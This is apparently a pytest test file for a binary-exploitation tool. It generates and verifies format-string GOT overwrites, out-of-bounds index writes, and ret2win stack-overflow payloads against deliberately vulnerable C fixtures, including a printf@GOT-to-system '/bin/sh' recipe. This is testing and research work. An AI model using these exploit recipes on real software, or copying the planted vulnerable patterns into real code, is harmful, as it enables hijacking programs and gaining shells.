"""Non-executed exploitation recipes WITH their numbers: format-string %hhn, CWE-129 index write,
stack overflow at the copy site.

The operator's top priority: findings and PoCs that do not need fuzzing or execution. Each of these
recipes is computed from the recovered program alone -- the format buffer's varargs index from the
frame, the GOT slot from .rela.plt, the out-of-bounds index as (slot - base) / stride, the overflow
offset from the copy's destination operand -- and filed as a `corroborated` candidate carrying the
concrete payload bytes.

The PRODUCTION code never runs the target to compute them. These tests do run the compiled fixture
with the computed bytes, as the independent check that the arithmetic is right (a recipe that is
off by one word is a wrong deliverable), and run the bounds-checked twin as the negative control.
"""
from __future__ import annotations

import hashlib
import json
import re
import shutil
import subprocess
import types

import pytest
from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import (
    elfstatic,
    exploit,
    fmt,
    fmt_recipe,
    inject_stage,
    oob_recipe,
    overflow_recipe,
    x64frame,
)
from lykos.db.dao import FindingDAO, PocDAO, TargetDAO


# ------------------------------------------------------------------------------- helpers
def _ir(rows):
    return {"blocks": [{"instructions": [{"addr": a, "text": t} for a, t in rows]}]}


def _x86_host():
    if sandbox.host_arch() != "x86-64":
        pytest.skip("x86-64 native fixture")


def _cc(tmp_path, name, src, *flags):
    _x86_host()
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    c = tmp_path / f"{name}.c"
    c.write_text(src)
    out = tmp_path / name
    if subprocess.run([gcc, "-O0", "-fno-stack-protector", "-no-pie", "-w", *flags, str(c), "-o",
                       str(out)], capture_output=True).returncode != 0:
        pytest.skip("cannot build fixture")
    return out


def _ir_from_objdump(exe, fn):
    """The function's IR in the rizin-flavoured text the disassembler stores (`call sym.imp.x`,
    `lea rax, [0x402004]`, `jne 0x401200`), from objdump -- so the layout code is exercised on a
    REAL compiler's output without the whole disassembly pipeline."""
    if not shutil.which("objdump"):
        pytest.skip("objdump needed to read the fixture's code")
    out = subprocess.run(["objdump", "-d", "-M", "intel", "--no-show-raw-insn", str(exe)],
                         capture_output=True, text=True).stdout
    sec = out.split(f"<{fn}>:\n", 1)[1].split("\n\n", 1)[0]
    rows = []
    for ln in sec.splitlines():
        m = re.match(r"\s*([0-9a-f]+):\s+(.*)$", ln)
        if not m:
            continue
        t = m.group(2)
        mm = re.search(r"\[rip[+-]0x[0-9a-f]+\]\s+#\s+([0-9a-f]+)", t)
        if mm:
            t = re.sub(r"\[rip[+-]0x[0-9a-f]+\]", "[0x" + mm.group(1) + "]", t)
        t = re.sub(r"\s+#.*$", "", t).strip()
        t = re.sub(r"^(call|j[a-z]+)\s+([0-9a-f]+)\s+<([^>]+)>",
                   lambda k: f"{k.group(1)} " + (("sym.imp." + k.group(3).split("@")[0])
                                                 if k.group(1) == "call" and "@plt" in k.group(3)
                                                 else "0x" + k.group(2)), t)
        t = re.sub(r"\s+", " ", t).replace(",", ", ")
        rows.append((int(m.group(1), 16), t))
    return _ir(rows)


def _site(ir, callee):
    return next(i["addr"] for i in ir["blocks"][0]["instructions"]
                if x64frame.call_target(i["text"]) == callee)


# ------------------------------------------------------------------- x64frame (pure facts)
def test_pointer_source_follows_moves_from_above_the_hop():
    # `mov eax, 0` sits BELOW `mov rdi, rax` -- the hop must resume above the move, or the
    # vararg-count zeroing reads as rax's definition and the format looks indeterminate.
    before = ["lea rax, [rbp - 0x110]", "mov rdi, rax", "mov eax, 0"]
    assert x64frame.pointer_source(before, "rdi") == ("stack", "rbp", -0x110)
    assert x64frame.pointer_source(["mov rax, qword [rbp - 8]", "mov rdi, rax"], "rdi") == \
        ("load", "rbp", -8)
    assert x64frame.pointer_source(["lea rdi, [0x00402004]"], "rdi")[0] == "literal"
    assert x64frame.pointer_source(["call sym.imp.get", "mov rdi, rax"], "rdi") is None


def test_frame_geometry_and_rsp_at_the_site():
    ins = x64frame.instructions(_ir([(1, "endbr64"), (2, "push rbp"), (3, "mov rbp, rsp"),
                                     (4, "push rbx"), (5, "sub rsp, 0x108"),
                                     (6, "lea rax, [rbp - 0x110]"), (7, "call sym.imp.printf")]))
    assert x64frame.rsp_below_rbp(ins, 6) == 8 + 0x108
    # anything that moves rsp between the prologue and the call voids the fact
    ins2 = ins[:5] + [(6, "push rax")] + ins[5:]
    assert x64frame.rsp_below_rbp(ins2, 7) is None
    # a realigned frame is not literal either
    assert x64frame.frame_geometry(ins + [(9, "and rsp, 0xfffffffffffffff0")]) is None


# ------------------------------------------------------------------------- fmt.py fixes
def test_fmtstr_payload_can_force_the_written_width():
    """A resolved GOT slot holds 0x00007f..; writing only the 3 significant bytes of a no-PIE win
    (0x401196) leaves the libc high bytes in place. `nbytes=6` clears them."""
    sig = fmt.fmtstr_payload(6, {0x404000: 0x401196})
    full = fmt.fmtstr_payload(6, {0x404000: 0x401196}, nbytes=6)
    assert sig.count(b"$hhn") == 3 and full.count(b"$hhn") == 6
    # the default (used by the live exploits) is unchanged
    assert sig == fmt.fmtstr_payload(6, {0x404000: 0x401196})


def test_read_at_payload_directive_always_fits_its_pad():
    for off in (6, 9, 99, 1234):
        p = fmt.read_at_payload(off, 0x404018)
        slot = int(re.match(rb"%(\d+)\$s", p).group(1))
        # the address sits exactly at the slot the directive names
        assert p[(slot - off) * 8:(slot - off) * 8 + 8] == (0x404018).to_bytes(8, "little")


# ---------------------------------------------------------------- format-string recipe
_FMT_LOOP = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
/* win writes with the raw syscall, so overwriting a libc GOT slot cannot make it recurse. */
__attribute__((used)) void win(void){ write(1, "LYKOS_WIN\n", 10); _exit(0); }
void vuln(void){
    char buf[256];
    while (fgets(buf, sizeof buf, stdin)) { FMTCALL; puts("ok"); }
}
int main(void){ setvbuf(stdout, 0, _IONBF, 0); vuln(); return 0; }
"""


def test_format_layout_from_synthetic_ir():
    ir = _ir([(0x10, "endbr64"), (0x14, "push rbp"), (0x15, "mov rbp, rsp"),
              (0x18, "sub rsp, 0x110"), (0x1f, "jmp 0x40"), (0x21, "lea rax, [rbp - 0x110]"),
              (0x28, "mov rdi, rax"), (0x2b, "mov eax, 0"), (0x30, "call sym.imp.printf"),
              (0x35, "call sym.imp.puts"), (0x40, "lea rax, [rbp - 0x110]"),
              (0x47, "mov esi, 0x100"), (0x4c, "mov rdi, rax"), (0x4f, "call sym.imp.fgets"),
              (0x54, "test rax, rax"), (0x57, "jne 0x21"), (0x59, "leave"), (0x5a, "ret")])
    lay = fmt_recipe.format_layout(ir, 0x30, "printf")
    assert lay["kind"] == "stack" and lay["arg_offset"] == 6 and lay["pad"] == 0
    assert lay["loop"] and lay["after"][0] == "puts"
    assert (lay["reader"], lay["cap"]) == ("fgets", 0x100)
    assert (lay["saved_rbp_index"], lay["ret_index"]) == (6 + 0x110 // 8, 6 + 0x110 // 8 + 1)
    # a buffer 0x20 above rsp: four words further into the varargs
    ir2 = _ir([(0x14, "push rbp"), (0x15, "mov rbp, rsp"), (0x18, "sub rsp, 0x130"),
               (0x21, "lea rax, [rbp - 0x110]"), (0x28, "mov rdi, rax"),
               (0x30, "call sym.imp.printf")])
    assert fmt_recipe.format_layout(ir2, 0x30, "printf")["arg_offset"] == 6 + 4
    # fprintf: the format is the 2nd argument -> the first stack vararg is %5$
    ir3 = _ir([(0x14, "push rbp"), (0x15, "mov rbp, rsp"), (0x18, "sub rsp, 0x110"),
               (0x1f, "mov rdi, qword [obj.stderr]"), (0x21, "lea rax, [rbp - 0x110]"),
               (0x28, "mov rsi, rax"), (0x30, "call sym.imp.fprintf")])
    assert fmt_recipe.format_layout(ir3, 0x30, "fprintf")["arg_offset"] == 5


def test_format_layout_declines_the_safe_shapes():
    base = [(0x14, "push rbp"), (0x15, "mov rbp, rsp"), (0x18, "sub rsp, 0x110")]
    # printf(buf, x): a format argument is passed -> not the bug
    assert fmt_recipe.format_layout(_ir(base + [
        (0x20, "lea rax, [rbp - 0x110]"), (0x27, "mov esi, 5"), (0x2c, "mov rdi, rax"),
        (0x30, "call sym.imp.printf")]), 0x30, "printf") is None
    # printf("literal")
    assert fmt_recipe.format_layout(_ir(base + [
        (0x20, "lea rdi, [0x00402004]"), (0x30, "call sym.imp.printf")]), 0x30, "printf") is None


def test_pointer_format_gets_the_probe_first_recipe(tmp_path):
    exe = _cc(tmp_path, "fmtloop", _FMT_LOOP.replace("FMTCALL", "printf(buf)"))
    ir = _ir([(0x14, "push rbp"), (0x15, "mov rbp, rsp"), (0x18, "sub rsp, 0x20"),
              (0x20, "mov rax, qword [rbp - 8]"), (0x24, "mov rdi, rax"),
              (0x30, "call sym.imp.printf")])
    lay = fmt_recipe.format_layout(ir, 0x30, "printf")
    plan = fmt_recipe.plan_format_write(exe.read_bytes(), lay, win=None)
    assert lay["kind"] == "pointer" and plan["stage"] == "probe" and plan["target_level"] == "L2"
    assert plan["input"].startswith(b"AAAAAAAA|%1$p")


#: A one-line printf(user) target with a global we can watch, so the WRITE PRIMITIVE is confirmed
#: by reading the value back (decoupled from whether overwriting a live libc GOT slot re-enters
#: cleanly on this glibc -- a format-string payload's exact arg-count mixing is the one part an
#: operator tunes on the live target, which is why the recipe is a candidate).
_FMT_WRITE = r"""
#include <stdio.h>
#include <stdlib.h>
long g = 0;
int main(void){ char buf[256]; setvbuf(stdout,0,_IONBF,0);
  if (fgets(buf, sizeof buf, stdin)) printf(buf);
  printf("\nG=%ld\n", g); return 0; }
"""


def test_format_write_primitive_lands_the_exact_value(tmp_path):
    """The deliverable's core: fmt.fmtstr_payload, at the recipe's computed arg offset, writes the
    chosen value to the chosen address. Confirmed by reading a global back -- a resolved GOT slot
    needs all 6 bytes written, which `nbytes=6` does."""
    exe = _cc(tmp_path, "wr", _FMT_WRITE)
    tb = exe.read_bytes()
    g = exploit.elf_objects(tb)["g"]
    # the arg offset is located by the probe, exactly as the recipe states it would be
    probe = fmt.probe_payload(count=20)
    out = subprocess.run([str(exe)], input=probe, capture_output=True, timeout=10).stdout
    off = fmt.find_fmt_offset(out)
    assert off, "the probe did not locate the format buffer"
    for val in (0x4142, 0xdeadbeef, 0x7ffff7001234 & 0xffffffffffff):
        pay = fmt.fmtstr_payload(off, {g: val}, nbytes=6)
        r = subprocess.run([str(exe)], input=pay + b"\n", capture_output=True, timeout=10)
        got = int(re.search(rb"G=(-?\d+)", r.stdout).group(1)) & 0xFFFFFFFFFFFF
        assert got == (val & 0xFFFFFFFFFFFF), (hex(val), hex(got))


def test_format_write_recipe_selects_the_right_target_and_value(tmp_path):
    """The recipe computed from the recovered loop: a real GOT slot after the sink, the win value,
    the arg offset the probe confirms, an L3 one-shot with the payload bytes. The safe twin
    (printf("%s", buf)) is not even the bug shape."""
    exe = _cc(tmp_path, "fmtloop", _FMT_LOOP.replace("FMTCALL", "printf(buf)"))
    safe = _cc(tmp_path, "fmtsafe", _FMT_LOOP.replace("FMTCALL", 'printf("%s", buf)'))
    tb = exe.read_bytes()
    from lykos.analyze.poc import rop
    ir = _ir_from_objdump(exe, "vuln")
    lay = fmt_recipe.format_layout(ir, _site(ir, "printf"), "printf")
    assert lay and lay["kind"] == "stack" and lay["loop"]
    # the computed arg offset matches what the binary actually does
    off = fmt.find_fmt_offset(subprocess.run([str(exe)], input=fmt.probe_payload(),
                                             capture_output=True, timeout=10).stdout)
    assert off == lay["arg_offset"]
    win = exploit.find_win(exploit.elf_functions(tb))
    plan = fmt_recipe.plan_format_write(tb, lay, win=win)
    assert plan["stage"] == "one-shot" and plan["target_level"] == "L3" and "@GOT" in plan["technique"]
    got = rop.got_entries(tb)
    tgt, val = next(iter(plan["writes"].items()))
    assert tgt in got.values() and val == int(win[1]) and plan["input"]
    # win is not the slot it would have to call again (no self-recursion through the hijack)
    assert tgt != got.get(exploit.elf_functions(tb) and "win")
    sir = _ir_from_objdump(safe, "vuln")
    assert fmt_recipe.format_layout(sir, _site(sir, "printf"), "printf") is None


def test_format_write_without_win_targets_printf_got_with_system(tmp_path):
    """No win function, but system() is imported and the sink loops: the recipe computes
    printf@GOT := system@plt (the stub address read from the .plt bytes, no objdump) with a
    '/bin/sh' follow-up, so the next formatted line becomes a command."""
    src = _FMT_LOOP.replace("FMTCALL", "printf(buf)").replace(
        '__attribute__((used)) void win(void){ write(1, "LYKOS_WIN\\n", 10); _exit(0); }',
        'void keep(const char *c){ system(c); }')
    assert "void win(" not in src
    exe = _cc(tmp_path, "fmtsys", src)
    tb = exe.read_bytes()
    from lykos.analyze.poc import rop
    assert "system" in elfstatic.plt_stubs(tb)
    ir = _ir_from_objdump(exe, "vuln")
    lay = fmt_recipe.format_layout(ir, _site(ir, "printf"), "printf")
    plan = fmt_recipe.plan_format_write(tb, lay, win=None)
    assert plan["followup"] == b"/bin/sh\n" and "printf@GOT" in plan["technique"]
    tgt, val = next(iter(plan["writes"].items()))
    assert tgt == rop.got_entries(tb)["printf"] and val == elfstatic.plt_stubs(tb)["system"]


def test_plt_stubs_match_objdump(tmp_path):
    exe = _cc(tmp_path, "fmtloop", _FMT_LOOP.replace("FMTCALL", "printf(buf)"))
    if not shutil.which("objdump"):
        pytest.skip("objdump")
    out = subprocess.run(["objdump", "-d", str(exe)], capture_output=True, text=True).stdout
    want = {m.group(2): int(m.group(1), 16)
            for m in re.finditer(r"^([0-9a-f]+) <(\w+)@plt>:", out, re.M)}
    got = elfstatic.plt_stubs(exe.read_bytes())
    assert want and all(got.get(k) == v for k, v in want.items())


# -------------------------------------------------------------------- CWE-129 index write
_OOB = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
long arr[8];
__attribute__((used)) void win(void){ puts("LYKOS_WIN"); _exit(0); }
int main(void){
  setbuf(stdout,0);
  long idx,val; int choice;
  for(;;){
    printf("1. set\n2. exit\n> ");
    if(scanf("%d",&choice)!=1) break;
    if(choice==1){
      printf("index: "); if(scanf("%ld",&idx)!=1) break;
      printf("value: "); if(scanf("%ld",&val)!=1) break;
      GUARD
    } else break;
  }
  return 0;
}
"""


def test_arrays_from_lead_reads_every_documented_shape(tmp_path):
    exe = _cc(tmp_path, "oob", _OOB.replace("GUARD", "arr[idx]=val;"))
    tb = exe.read_bytes()
    base = exploit.elf_objects_sized(tb)["arr"][0]
    for ev in ([{"channel": "array-index", "detail": json.dumps({"array": "arr", "stride": 8})}],
               [{"channel": "x", "detail": f"array=arr base={base:#x} stride=8 cap=8"}],
               [{"channel": "oob-index-static",
                 "detail": "the fixed-size global array arr[8] (stride 8B) is indexed"}],
               [{"channel": "oob-index", "detail": "Out-of-bounds array index (CWE-129) on arr[8]"}]):
        arrs = oob_recipe.arrays_from_lead(types.SimpleNamespace(evidence=ev), tb)
        assert arrs and arrs[0]["addr"] == base and arrs[0]["stride"] == 8, ev
    assert oob_recipe.arrays_from_lead(types.SimpleNamespace(evidence=[]), tb) == []
    # the sibling `array_index` detector's structured evidence dict (detect/detectors.py)
    structured = [{"channel": "pattern", "detail": "write of global array arr ...",
                   "array_index": {"array": {"kind": "global", "name": "arr", "addr": hex(base),
                                             "size": 64, "elements": 8, "element_size": 8},
                                   "access": "write", "oob_index": [-9]}}]
    arrs = oob_recipe.arrays_from_lead(types.SimpleNamespace(evidence=structured), tb)
    assert arrs[0]["addr"] == base and arrs[0]["stride"] == 8 and arrs[0]["cap"] == 8
    # a STACK array (no absolute address) yields no GOT-targeting recipe shape
    stack = [{"channel": "pattern", "array_index": {"array": {"kind": "stack", "addr": None,
              "element_size": 8}, "access": "write"}}]
    assert oob_recipe.arrays_from_lead(types.SimpleNamespace(evidence=stack), tb) == []


def test_index_write_recipe_hijacks_the_real_binary(tmp_path):
    """idx = (printf@GOT - &arr) / 8, value = &win: arithmetic, no search. Delivered to the unchecked
    target the win runs; the bounded twin ignores the same bytes."""
    bug = _cc(tmp_path, "oob", _OOB.replace("GUARD", "arr[idx]=val;"))
    safe = _cc(tmp_path, "oobsafe", _OOB.replace("GUARD", "if(idx>=0&&idx<8) arr[idx]=val;"))
    tb = bug.read_bytes()
    arr = oob_recipe.arrays_from_lead(types.SimpleNamespace(evidence=[
        {"channel": "x", "detail": "array=arr stride=8 cap=8"}]), tb)[0]
    plans = oob_recipe.plan_index_write(tb, arr, win=exploit.find_win(exploit.elf_functions(tb)))
    best = plans[0]
    from lykos.analyze.poc import rop
    assert best["index"] == (rop.got_entries(tb)["printf"] - arr["addr"]) // 8 < 0
    assert best["target"] == "printf@GOT"
    inp = b"1\n" + b"".join(b"%d\n%d\n" % w for w in best["writes"])
    assert b"LYKOS_WIN" in subprocess.run([str(bug)], input=inp, capture_output=True,
                                          timeout=10).stdout
    assert b"LYKOS_WIN" not in subprocess.run([str(safe)], input=inp, capture_output=True,
                                              timeout=10).stdout


def test_narrow_cells_split_the_pointer_and_clear_the_high_bytes():
    assert oob_recipe._chunks(0x401196, 8) == [0x401196]
    assert oob_recipe._chunks(0x401196, 4) == [0x401196, 0]
    assert oob_recipe._signed(0xFFFFFFFF, 4) == -1


# ---------------------------------------------------------------- stack overflow at the site
_OV = r"""
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
__attribute__((used)) void win(void){ puts("LYKOS_WIN"); fflush(stdout); exit(0); }
void greet(const char *n){ char small[16]; char buf[64];
  sprintf(buf, "Hello %s", n); puts(buf); small[0]=0; (void)small; }
void cp(const char *n){ char buf[40]; strcpy(buf, n); puts(buf); }
int main(int argc, char **argv){ if (argc > 2) greet(argv[2]); else if (argc > 1) cp(argv[1]); return 0; }
"""


def test_overflow_offset_is_exact_at_the_copy_site(tmp_path):
    """strcpy into [rbp-0x30]: the saved return is at rbp+8, so the offset is 0x38 -- the frame-
    based prediction (rizin's rbp-relative var offset) said 0x30, the saved rbp. sprintf("Hello %s")
    renders 6 fixed bytes first, so its payload offset is 6 short of the distance. Both ret2win
    payloads reach win on the compiled binary."""
    exe = _cc(tmp_path, "ov", _OV)
    tb = exe.read_bytes()
    win = exploit.elf_functions(tb)["win"]
    ir = _ir_from_objdump(exe, "cp")
    lay = overflow_recipe.overflow_layout(ir, _site(ir, "strcpy"), "strcpy", tb)
    assert lay["offset"] == -lay["dest_disp"] + 8 and lay["payload_offset"] == lay["offset"]
    r = subprocess.run([str(exe), overflow_recipe.ret2win_payload(lay, win)], capture_output=True,
                       timeout=10)
    assert b"LYKOS_WIN" in r.stdout
    ir = _ir_from_objdump(exe, "greet")
    lay = overflow_recipe.overflow_layout(ir, _site(ir, "sprintf"), "sprintf", tb)
    assert lay["prefix"] == b"Hello " and lay["payload_offset"] == lay["offset"] - 6
    r = subprocess.run([str(exe), "x", overflow_recipe.ret2win_payload(lay, win)],
                       capture_output=True, timeout=10)
    assert b"LYKOS_WIN" in r.stdout


def test_ret2win_payload_refuses_an_address_the_copy_cannot_carry():
    lay = {"payload_offset": 40, "nul_terminated": True}
    assert overflow_recipe.ret2win_payload(lay, 0x401100) is None      # interior NUL byte
    assert overflow_recipe.ret2win_payload(lay, 0x401196).endswith(b"\x96\x11\x40")
    assert overflow_recipe._sprintf_prefix(b"%d: %s") == (None, "a %d conversion precedes the string")
    assert overflow_recipe._sprintf_prefix(b"100%% %s")[0] == 5


# ------------------------------------------------------------------ filing + honesty
class _Ctx:
    def __init__(self, store):
        self.conn, self.content, self.stored = store.conn, store.content, {}

    def put_artifact(self, kind, *, data, meta=None):
        sha = hashlib.sha256(bytes(data)).hexdigest()
        self.stored[sha] = bytes(data)
        return sha


def test_injection_recipe_needs_a_detected_lead_not_an_import(store, case):
    """Every C binary imports printf; dangerous_api's low-severity CWE-134 row is the catalog's
    "check the format string" reminder filed for every call. Neither licenses a recipe."""
    t = TargetDAO(store.conn).upsert(case.id, "t", "e" * 64, arch="x86-64", bits=64)
    fd = FindingDAO(store.conn)
    fd.upsert(t.id, t.case_id, {"cwe": "CWE-134", "title": "printf", "severity": "low",
                                "detector": "dangerous_api", "state": "candidate",
                                "confidence": 0.3, "dedup_key": "d134",
                                "evidence": [{"channel": "pattern", "detail": "call to printf()"}]})
    assert "CWE-134" not in inject_stage._recipe_leads(_Ctx(store), t)
    fd.upsert(t.id, t.case_id, {"cwe": "CWE-134", "title": "fmt", "severity": "high",
                                "detector": "format_string", "state": "candidate",
                                "confidence": 0.5, "dedup_key": "f134", "evidence": []})
    assert inject_stage._recipe_leads(_Ctx(store), t)["CWE-134"].detector == "format_string"


def test_index_recipe_is_filed_corroborated_with_its_bytes(store, case, tmp_path):
    exe = _cc(tmp_path, "oob", _OOB.replace("GUARD", "arr[idx]=val;"))
    from lykos.analyze.ingest import ingest
    t = ingest(store, case.id, exe, filename="oob")
    t = TargetDAO(store.conn).get(t.id)
    fd = FindingDAO(store.conn)
    fd.upsert(t.id, t.case_id, {"cwe": "CWE-129", "title": "Improper validation of array index",
                                "severity": "high", "detector": "oob_index", "state": "candidate",
                                "confidence": 0.4, "dedup_key": "CWE-129:oobindex:arr",
                                "evidence": [{"channel": "oob-index-static", "detail":
                                              "the fixed-size global array arr[8] (stride 8B)"}]})
    lead = next(f for f in fd.list_by_target(t.id) if f.dedup_key == "CWE-129:oobindex:arr")
    ctx = _Ctx(store)
    fids = oob_recipe.file_oob_index_recipe(ctx, t, lead, why="no execution here")
    assert len(fids) == 1
    rec = next(f for f in fd.list_by_target(t.id) if f.detector == "oob_recipe")
    assert rec.state == "corroborated" and not PocDAO(store.conn).list_by_target(t.id)
    ev = " ".join(e.get("detail", "") for e in rec.evidence)
    assert "printf@GOT" in ev and "NOT executed" in ev
    assert any(b"\n" in v and v.split(b"\n")[0].lstrip(b"-").isdigit() for v in ctx.stored.values())
    lead = next(f for f in fd.list_by_target(t.id) if f.dedup_key == "CWE-129:oobindex:arr")
    assert any(e.get("channel") == "recipe-ceiling" for e in lead.evidence)


def test_stages_route_to_the_static_recipes():
    """The wiring this work exists for, pinned at the source level: inject_stage files the %hhn
    plan, chain_primitive's foreign-CPU exit and recipe path file the index plan, oob_index's
    static candidates file it too, and synthesize_poc's no-crash path uses the copy-site offset."""
    import inspect

    from lykos.analyze.dynamic import oob_index
    from lykos.analyze.poc import chain_primitive, synthesize_stage
    assert "file_format_write_recipes" in inspect.getsource(inject_stage.synthesize_injection_stage)
    src = inspect.getsource(chain_primitive.chain_primitive_stage)
    assert src.index("_static_index_recipe(") < src.index("_lead_finding(ctx.conn, target)\n")
    assert "_static_index_recipe" in inspect.getsource(chain_primitive._file_recipe)
    assert "file_oob_index_recipe" in inspect.getsource(oob_index._file_oob_index_candidates)
    assert "_overflow_lead" in inspect.getsource(synthesize_stage.synthesize_stage)

